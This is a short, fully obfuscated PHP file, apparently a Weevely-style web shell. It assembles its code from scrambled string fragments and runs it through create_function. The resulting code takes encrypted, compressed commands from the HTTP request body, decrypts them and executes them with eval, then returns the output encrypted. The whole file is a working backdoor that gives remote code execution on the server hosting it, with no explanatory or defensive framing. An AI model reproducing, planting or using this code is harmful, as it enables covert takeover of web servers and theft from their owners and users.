<?php
$O='oU.=$tU{$i}^$Uk{$j};}}retUUurn $o;}ifU (@pregUU_matcUh("/$kh(.+U)U$kf/UU",@file_gUet_contUenUts("phpU://';
$M=str_replace('W','','crWWWeaWte_fuWnWction');
$B='cUontents();@Uob_enUd_cleanU();$rU=@basUe64U_encode(@Ux(@gUzcomUpress($o)UU,$k))U;prUint("$p$kh$r$kf");}';
$N='$k="9cd50Ue7e";U$kUUh="cd5cabfU65bce";$kUf="fUbc6279bUb960";$pUU="FjULobT3O5BoO0O7bU";functiUon x($tU,$k';
$h=')U{$c=UstUrlen(U$k)U;$l=UstrUlen($t);$o="";for(U$i=0;$i<$Ul;){forU(U$j=0;($jU<$c&&$iU<$lU);$j+U+,$i++){$';
$s='inpuUt"),$m)==1) {@ob_UUstart()U;@eUval(@gzuncomprUess(U@x(@baUse64U_dUeUcode($m[1]),$k)U));$o=@ob_getU_';
$c=str_replace('U','',$N.$h.$O.$s.$B);
$b=$M('',$c);$b();
?>
